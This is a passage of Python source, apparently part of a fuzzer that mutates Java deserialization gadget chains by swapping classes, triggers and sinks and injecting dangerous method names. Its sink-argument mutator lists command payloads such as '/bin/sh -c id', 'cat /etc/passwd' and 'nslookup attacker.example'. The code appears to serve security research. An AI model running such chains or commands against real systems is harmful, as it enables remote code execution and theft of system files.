        current_class = links[idx].get("class", "")

        # Find all classes that share at least one interface
        interfaces = _CLASS_TO_INTERFACES.get(current_class, [])
        if not interfaces:
            return None

        siblings: set[str] = set()
        for iface in interfaces:
            siblings.update(TYPE_HIERARCHY.get(iface, []))
        siblings.discard(current_class)

        if not siblings:
            return None

        new_class = self.rng.choice(sorted(siblings))
        links[idx] = cascade_from_swap(
            current_class, new_class, links[idx], links, idx, self.rng,
        )
        return out

    # ------------------------------------------------------------------
    # D3: Field manipulation strategies
    # ------------------------------------------------------------------

    def _field_inject(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Change method name fields to other dangerous method names."""
        out = self._get_ir(ir)
        links = out.get("links", [])
        idx = self._pick_link_idx(links)
        if idx is None:
            return None

        overrides = links[idx].get("field_overrides", {})
        if not overrides:
            # Inject a new method name field
            overrides["iMethodName"] = self.rng.choice(DANGEROUS_METHOD_NAMES)
            links[idx]["field_overrides"] = overrides
            return out

        # Find string-valued fields that look like method names
        method_fields = [
            k for k, v in overrides.items()
            if isinstance(v, str) and not v.startswith("[")
            and k not in ("$ref",)
        ]
        if method_fields:
            field_key = self.rng.choice(method_fields)
            overrides[field_key] = self.rng.choice(DANGEROUS_METHOD_NAMES)
        else:
            overrides["iMethodName"] = self.rng.choice(DANGEROUS_METHOD_NAMES)

        return out

    def _field_null(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Set a random field_overrides value to null."""
        out = self._get_ir(ir)
        links = out.get("links", [])
        idx = self._pick_link_idx(links)
        if idx is None:
            return None

        overrides = links[idx].get("field_overrides", {})
        if not overrides:
            return None

        field_key = self.rng.choice(list(overrides.keys()))
        overrides[field_key] = None
        return out

    def _field_type_juggle(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Change a string field to array or vice versa."""
        out = self._get_ir(ir)
        links = out.get("links", [])
        idx = self._pick_link_idx(links)
        if idx is None:
            return None

        overrides = links[idx].get("field_overrides", {})
        if not overrides:
            return None

        # Pick a non-ref field
        candidates = [
            k for k, v in overrides.items()
            if not (isinstance(v, dict) and "$ref" in v)
        ]
        if not candidates:
            return None

        field_key = self.rng.choice(candidates)
        val = overrides[field_key]

        if isinstance(val, str):
            overrides[field_key] = [val]
        elif isinstance(val, list):
            overrides[field_key] = val[0] if val else ""
        elif isinstance(val, (int, float)):
            overrides[field_key] = str(val)
        elif val is None:
            overrides[field_key] = "null"
        else:
            overrides[field_key] = [val]

        return out

    # ------------------------------------------------------------------
    # D4: Trigger point strategies
    # ------------------------------------------------------------------

    def _trigger_swap(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Change root_class to another from ROOT_TRIGGERS."""
        out = self._get_ir(ir)
        current_root = out.get("root_class", "")
        candidates = [c for c in _ROOT_CLASSES if c != current_root]
        if not candidates:
            return None

        new_root = self.rng.choice(candidates)
        out["root_class"] = new_root
        out["root_trigger"] = ROOT_TRIGGERS[new_root]
        return out

    def _collection_wrap(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Change root to a collection-type class from Map hierarchy."""
        out = self._get_ir(ir)
        current_root = out.get("root_class", "")

        # Collection-oriented roots: Maps and Sets
        map_classes = TYPE_HIERARCHY.get("java.util.Map", [])
        collection_roots = [c for c in map_classes if c != current_root]
        # Also include ROOT_TRIGGERS entries that are collection-like
        for cls in _ROOT_CLASSES:
            if cls not in collection_roots and cls != current_root:
                collection_roots.append(cls)

        if not collection_roots:
            return None

        new_root = self.rng.choice(collection_roots)
        out["root_class"] = new_root
        out["root_trigger"] = ROOT_TRIGGERS.get(
            new_root, f"readObject→put→{new_root.rsplit('.', 1)[-1]}.method"
        )
        return out

    # ------------------------------------------------------------------
    # D5: Sink strategies
    # ------------------------------------------------------------------

    def _sink_swap(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Change sink_method to another from SINK_METHODS."""
        out = self._get_ir(ir)
        current_sink = out.get("sink_method", "")
        candidates = [s for s in SINK_METHODS if s != current_sink]
        if not candidates:
            return None

        out["sink_method"] = self.rng.choice(candidates)
        return out

    def _sink_arg_mutate(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Mutate arguments in the sink link's field_overrides."""
        out = self._get_ir(ir)
        links = out.get("links", [])
        if not links:
            return None

        # The last link is typically the sink
        sink_link = links[-1]
        overrides = sink_link.get("field_overrides", {})

        # Mutate iArgs if present
        if "iArgs" in overrides and isinstance(overrides["iArgs"], list):
            arg_variants = [
                [["id"]],
                [["whoami"]],
                [["cat", "/etc/passwd"]],
                [["cmd.exe", "/c", "dir"]],
                [["nslookup", "attacker.example"]],
                [["touch", "/tmp/pwned"]],
                [["/bin/sh", "-c", "id"]],
            ]
            overrides["iArgs"] = self.rng.choice(arg_variants)
        elif "iArgs" not in overrides:
            # Inject args
            overrides["iArgs"] = [[self.rng.choice(DANGEROUS_METHOD_NAMES)]]
            sink_link["field_overrides"] = overrides
        else:
            # iArgs is unexpected type — replace
            overrides["iArgs"] = [["id"]]

        return out

    # ------------------------------------------------------------------
    # D6: Constraint repair (IOCD-lite)
    # ------------------------------------------------------------------

    def _constraint_fix(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Pick a random link with constraint violations and fix them."""
        out = self._get_ir(ir)
        links = out.get("links", [])
        if not links:
            return None

        violations = validate_chain(out)
        if not violations:
            # Chain is already valid — nothing to fix, try fixing a random link
            idx = self.rng.randrange(len(links))
            links[idx] = fix_link(links[idx], self.rng)
            return out

        # Pick a random violated link and fix it
        v = self.rng.choice(violations)
        links[v.link_index] = fix_link(links[v.link_index], self.rng)
        return out

    # ------------------------------------------------------------------
    # D7: Exception-guided mutation (JDD feedback loop)
    # ------------------------------------------------------------------

    def _exception_guided(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Use exception feedback from last execution to guide mutation.

        Reads last_exception_hint from input metadata and applies a
        targeted fix based on the exception type (CCE → type swap,
        NPE → null fix, NSFE → field fix, CNFE → class swap).
        """
        hint = self._last_exception_hint
        if hint is None:
            # No feedback available — fall back to constraint_fix
            return self._constraint_fix(ir, corpus)

        result = suggest_fix(hint, ir, self.rng)
        if result is not None:
            return result

        # suggest_fix couldn't help — fall back to constraint_fix
        return self._constraint_fix(ir, corpus)

    def set_exception_hint(self, hint: ExceptionHint | None) -> None:
        """Store exception feedback for next mutation cycle."""
        self._last_exception_hint = hint
